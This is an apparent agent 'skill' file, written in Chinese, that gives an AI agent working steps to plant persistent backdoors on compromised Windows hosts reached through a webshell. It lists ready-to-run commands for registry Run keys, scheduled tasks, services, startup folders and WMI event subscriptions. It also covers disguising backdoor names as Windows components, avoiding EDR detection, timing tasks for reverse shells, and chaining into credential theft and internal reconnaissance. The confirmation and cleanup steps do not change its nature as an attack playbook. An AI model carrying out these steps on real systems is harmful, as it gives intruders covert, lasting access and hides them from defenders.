---
name: persistence-windows
description: 在 Windows 目标上建立持久化后门，包括注册表 Run 键、计划任务、服务、WMI 事件订阅、启动目录等方式。当任务涉及 Windows 持久化、后门植入、维持访问、注册表后门、计划任务后门时使用。执行前必须获得用户明确确认。
enabled: true
---

# Windows 持久化

当用户明确要求在 Windows 目标上建立持久化访问时，使用这个 skill。

**重要：执行前必须向用户明确说明将要进行的操作和影响，并等待确认。**

---

## 一、OPSEC 与环境约束

| 原则 | 说明 |
|---|---|
| 用户确认优先 | 所有写操作执行前必须获得用户明确确认 |
| 最小痕迹 | 只植入一种持久化方式，避免多重痕迹 |
| 伪装命名 | 注册表值名、任务名、服务名要像系统组件 |
| 避免触发 EDR | 不使用 PowerShell 下载、不创建明显的 reverse shell 进程链 |
| 记录清理路径 | 每次植入必须记录完整清理命令 |
| 验证生效 | 植入后必须验证持久化已生效 |

**WebShell 环境注意：**
- WebShell 通常以 IIS AppPool / NETWORK SERVICE 运行，可能无法写 HKLM
- PowerShell 可能处于 Constrained Language Mode，WMI 订阅不可用
- 部分 EDR 会监控注册表 Run 键和计划任务创建
- Windows Defender 可能拦截已知 payload 签名
- 服务创建需要管理员权限，且服务二进制需要处理 SCM 消息

---

## 二、目标

在目标机器上建立至少一种持久化机制，确保即使 Webshell 被清理或服务重启后，仍可恢复访问。

---

## 三、工作流程

### 执行前：制定计划

在任何工具调用前，先输出：

1. **目标**：在目标 Windows 主机上建立持久化访问
2. **路径**：确认权限和环境 → 选择合适方式 → 向用户确认 → 执行植入 → 验证生效 → 记录清理路径
3. **终止条件**：至少一种持久化方式部署成功并验证，或所有方式均因权限不足失败时停止

如果已有侦察摘要，先读取 `privilegeProfile`（SYSTEM/Admin/普通用户）和 `hostProfile`（OS 版本）。

### 第一步：环境确认

```cmd
whoami /priv
net localgroup administrators
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>nul
```

### 第二步：选择持久化方式

根据环境选择（向用户说明后等待确认）：

| 权限 | 环境 | 推荐方式 | 备选 |
|---|---|---|---|
| SYSTEM/Admin | 通用 | 计划任务（SYSTEM 级） | 服务 |
| SYSTEM/Admin | 需高隐蔽 | WMI 事件订阅 | 服务 |
| 普通用户 | 通用 | 注册表 HKCU Run 键 | 用户级计划任务 |
| 普通用户 | 备选 | 启动目录 | HKCU Run 键 |

### 第三步：执行植入（用户确认后）

### 第四步：验证生效

### 第五步：记录清理路径并写入摘要

---

## 四、持久化方式

### 方式一：注册表 Run 键（低权限可用）

**适用：** 任何用户（HKCU 无需管理员）

**植入：**
```cmd
:: 当前用户级别（无需管理员）
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\Public\update.exe" /f

:: 系统级别（需要管理员）
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\update.exe" /f
```

**验证：**
```cmd
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate"
```

**清理：**
```cmd
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f
```

**触发条件：** 用户登录时执行。

**注意：**
- 键名要像系统组件（`WindowsUpdate`、`SecurityHealth`、`OneDriveSync`）
- HKCU 只在当前用户登录时触发，HKLM 对所有用户生效
- EDR 可能监控此位置，选择不太敏感的值名

### 方式二：计划任务（推荐，灵活性高）

**适用：** 普通用户可创建用户级任务；管理员可创建系统级任务

**植入：**
```cmd
:: 系统启动时执行（需要管理员，以 SYSTEM 身份运行）
schtasks /create /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /tr "C:\Windows\Temp\update.exe" /sc onstart /ru SYSTEM /f

:: 用户级，每 5 分钟执行（无需管理员）
schtasks /create /tn "MicrosoftEdgeUpdate" /tr "C:\Users\Public\update.exe" /sc minute /mo 5 /f

:: 用户登录时执行
schtasks /create /tn "OneDriveSync" /tr "C:\Users\Public\update.exe" /sc onlogon /f
```

**验证：**
```cmd
schtasks /query /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /fo LIST /v
```

**清理：**
```cmd
schtasks /delete /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /f
```

**注意：**
- 任务名用路径形式更隐蔽（`Microsoft\Windows\WindowsUpdate\UpdateCheck`）
- `/sc onstart /ru SYSTEM` 开机触发，适合持久驻留
- `/sc minute /mo 5` 定时触发，适合反弹 shell（频率不要太高）

### 方式三：Windows 服务（需要管理员，最稳定）

**适用：** 有管理员权限，目标需要开机自启

**植入：**
```cmd
sc create "WinNetHelper" binPath= "C:\Windows\Temp\svc.exe" start= auto DisplayName= "Windows Network Helper"
sc description "WinNetHelper" "Provides network connectivity assistance for Windows components."
sc start "WinNetHelper"
```

**验证：**
```cmd
sc query "WinNetHelper"
```

**清理：**
```cmd
sc stop "WinNetHelper"
sc delete "WinNetHelper"
```

**注意：**
- `binPath=` 后面有空格是 sc 命令语法要求
- 服务二进制需要能处理 SERVICE_CONTROL 消息，普通 exe 可能无法正常启动
- 服务名和显示名要像系统服务（`WinNetHelper`、`WinDefenderSync`）

### 方式四：启动目录（低权限，简单）

**适用：** 低权限用户，只在用户登录时触发

**植入：**
```cmd
:: 当前用户启动目录
copy C:\Users\Public\update.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WinHelper.exe"

:: 所有用户启动目录（需要管理员）
copy C:\Users\Public\update.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\WinHelper.exe"
```

**验证：**
```cmd
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WinHelper.exe"
```

**清理：**
```cmd
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WinHelper.exe"
```

### 方式五：WMI 事件订阅（需要管理员，隐蔽性最高）

**适用：** 有管理员权限，需要无文件或高隐蔽性持久化

**植入（PowerShell）：**
```powershell
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "WindowsUpdateFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "WindowsUpdateConsumer"
    CommandLineTemplate = "C:\Windows\Temp\update.exe"
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

**验证：**
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq "WindowsUpdateFilter"}
```

**清理：**
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq "WindowsUpdateFilter"} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq "WindowsUpdateConsumer"} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
```

**注意：**
- 系统重启后仍有效，不依赖文件系统明显痕迹
- PowerShell Constrained Language Mode 下不可用
- 清理最复杂，需要删除三个 WMI 对象

---

## 五、工具优先级

| 优先级 | 工具 | 用途 |
|---|---|---|
| 1 | `CommandTools` | 环境确认、执行植入命令、验证 |
| 2 | `FileTools` | 上传 payload 到目标服务器 |

---

## 六、失败回退

| 场景 | 回退策略 |
|---|---|
| HKLM 写入被拒绝 | 回退到 HKCU |
| 计划任务创建失败 | 尝试注册表 Run 键 |
| PowerShell CLM 限制 | 放弃 WMI 订阅，使用 cmd 方式 |
| 服务创建失败 | 尝试计划任务 |
| EDR 拦截 payload | 建议用户更换 payload 或使用 LOLBins |
| 启动目录不可写 | 尝试注册表 Run 键 |
| 所有方式均失败 | 报告环境限制，建议用户评估其他方案 |

---

## 七、输出格式

```markdown
## Windows 持久化摘要

**当前权限**：{username}（{SYSTEM/Admin/User}）
**选择方式**：{method_name}
**状态**：{已部署并验证 / 部署失败}

---

## 植入详情

| 项目 | 内容 |
|------|------|
| 方式 | {registry_run / scheduled_task / service / startup_dir / wmi_event} |
| 位置 | {注册表路径 / 任务名 / 服务名 / 文件路径} |
| 触发条件 | {登录 / 开机 / 定时 / 事件} |
| 运行身份 | {SYSTEM / 当前用户} |
| 连接方式 | {如何重新接入} |

## 清理命令

```cmd
{完整清理命令}
```

## 验证结果

{验证输出}

## 下一步建议

1~2 条具体建议
```

### 建议示例

| 场景 | 建议 |
|---|---|
| 持久化成功 | 使用 recon-internal-network skill 探测内网 |
| 需要凭据 | 使用 hunt-credentials skill 收集凭据 |
| 权限不足 | 先使用 escalate-windows-privilege skill 提权 |

---

## 八、决策规则

| 场景 | 行为 |
|---|---|
| 执行前 | 必须向用户确认，说明写入内容和位置 |
| 多种方式可用 | 推荐计划任务（灵活、易清理、可选 SYSTEM 级） |
| 无管理员权限 | 优先 HKCU Run 键或用户级计划任务 |
| 需要最高隐蔽性 + Admin | WMI 事件订阅 |
| 已是 SYSTEM | 服务方式优先（最稳定） |
| 命名规范 | 像系统组件，避免 `shell`、`backdoor` 等 |
| 植入数量 | 只植入一种，避免多重痕迹 |
| 植入后 | 必须验证生效并记录清理命令 |
| 所有植入信息 | 写入侦察摘要 |

---

## 九、结构化摘要写入

完成后必须：

1. `manage_recon_summary(action="append")` — 已部署的持久化方式、路径和验证结果
2. `manage_recon_summary(action="append")` — 机器可读字段

结构化 patch 示例：

```json
{
  "persistenceProfile": {
    "windows": {
      "methods": [
        {
          "type": "scheduled_task",
          "deployed": true,
          "taskName": "Microsoft\\Windows\\WindowsUpdate\\UpdateCheck",
          "payload": "C:\\Windows\\Temp\\update.exe",
          "trigger": "onstart",
          "runAs": "SYSTEM",
          "verified": true,
          "cleanup": "schtasks /delete /tn \"Microsoft\\Windows\\WindowsUpdate\\UpdateCheck\" /f"
        }
      ],
      "cleanupNotes": "删除计划任务并清除 payload 文件"
    }
  }
}
```

---

## Skill 元数据

- riskLevel: `high`
- accessMode: `write_destructive`
- requiredTools: `CommandTools`, `FileTools`
- optionalTools: `RegistryTools`, `ScheduledTaskTools`, `ServiceManagerTools`, `PersistenceTools`
- produces: `persistenceProfile.windows`, `openQuestions`
- recommendedNextSkills: `recon-internal-network`, `hunt-credentials`
- forbiddenByDefault: 未经用户确认不得执行任何写入操作
